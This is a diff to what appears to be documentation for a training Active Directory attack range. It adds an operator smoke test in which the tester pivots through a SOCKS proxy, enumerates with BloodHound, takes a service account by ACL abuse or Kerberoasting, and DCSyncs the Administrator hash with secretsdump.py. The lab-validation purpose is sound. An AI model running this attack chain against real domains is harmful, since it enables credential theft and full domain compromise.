@@ -54,3 +54,24 @@ material.
 
 The domain re-provisions fresh on every boot; the Administrator proof hash is stable as long as
 `ADRANGE_ADMIN_PASSWORD` is unchanged.
+
+## Going live for governed credit (operator smoke test)
+
+Everything except the live attack is verified automatically: the portal's
+`/admin/adrange?token=<ADRANGE_PROOF_TOKEN>` runs a real probe of the DC over the
+private network and must report `validation.ok: true` with all seven path checks
+true. The one step that needs a box with open internet (not the build container)
+is proving the attack chain works through the SOCKS pivot:
+
+1. Put the SOCKS pivot in `/etc/proxychains4.conf` (strict_chain):
+   `socks5 <ADRANGE_HOST> <ADRANGE_SOCKS_PORT> <ADRANGE_SOCKS_USER> <ADRANGE_SOCKS_PASSWORD>`
+2. Enumerate:   `proxychains bloodhound-python -d qwalora.range -u ranger -p '<foothold pw>' -ns 127.0.0.1 --dns-tcp -c all`
+3. Take svc_mssql (ACL abuse or Kerberoast), then DCSync:
+   `proxychains secretsdump.py qwalora.range/svc_mssql:'<pw>'@127.0.0.1 -just-dc-user Administrator`
+4. The recovered Administrator NT hash, pasted into the board 5/6 workspace
+   "Submit proof" box, must verify. (It equals `MD4(UTF-16LE(ADRANGE_ADMIN_PASSWORD))`.)
+
+Once that passes, set `ADRANGE_ADAPTER_VERIFIED=1` on the portal so a verified
+live compromise can back isolated-board credit under governance (mirrors
+`LUDUS_ADAPTER_VERIFIED`). Until then the range is fully usable and the proof is
+recorded, but it is not counted as a governed real-range award (fail-closed).
